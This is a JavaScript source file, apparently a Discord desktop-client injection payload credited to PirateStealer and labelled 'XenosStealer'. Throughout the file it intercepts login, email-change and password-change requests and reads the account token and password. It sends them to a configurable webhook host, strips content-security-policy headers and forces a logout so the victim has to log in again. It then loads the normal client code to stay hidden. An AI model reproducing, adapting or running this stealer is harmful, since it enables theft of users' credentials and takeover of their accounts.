// Original Code From PirateStealer
// Original Payload: https://github.com/Stanley-GF/PirateStealer/blob/main/src/injection/injection.js

const { BrowserWindow, session } = require('electron');
const fs = require('fs');
const path = require('path');
const webhook = "%WEBHOOK_LINK%"; // No put "/" at the end
const Filters = {
    1: {urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]},
    2: {urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]} 
};

class Events {
    constructor(event, token, data) {
        this.event = event;
        this.data = data;
        this.token = token;
    }
    handle() {
        switch (this.event) {
            case 'passwordChanged':
                passwordChanged(this.token, this.data.new_password);
                break;
            case 'userLogin':
                userLogin(this.token, this.data.password);
                break;
            case 'emailChanged':
                emailChanged(this.token, this.data.password);
                break;
        }
    }
}

async function firstTime() {
    if (!fs.existsSync(path.join(__dirname, "XenosStealer"))) return !0

    fs.rmdirSync(path.join(__dirname, "XenosStealer"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1

}

session.defaultSession.webRequest.onBeforeRequest(Filters[2], (details, callback) => {
    if (firstTime()) {}
    callback({})
    return;
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})

// Main functions
async function userLogin(token, password) {
    SendToXenos(token, password)
}
async function emailChanged(token, password) {    
    SendToXenos(token, password)
}
async function passwordChanged(token, newPassword) {
    SendToXenos(token, newPassword)
}

// Helpers functions
async function SendToXenos(token, password="") {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();xhr.open("GET", "${webhook}/api?type=addtoken&token=${token}&password=${password}", true);;xhr.setRequestHeader('Access-Control-Allow-Origin', '*');xhr.Send();`, !0)
}

async function getToken() {
    const window = BrowserWindow.getAllWindows()[0];
    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
    return token;
}

session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
    if (details.statusCode != 200) return;

    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data)
    const token = await getToken();

    switch (true) {
        case details.url.endsWith('login'):
            var event = new Events('userLogin', token, {
                password: data.password,
                email: data.login
            });
            event.handle();
            return;
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            if (!data.password) return;
            if (data.email) {
                var event = new Events('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();

            };
            if (data.new_password) {
                var event = new Events('passwordChanged', token, {
                    password: data.password,
                    new_password: data.new_password
                });
                event.handle();
            };
            return;
        default:
            break;
    }
});

module.exports = require('./core.asar');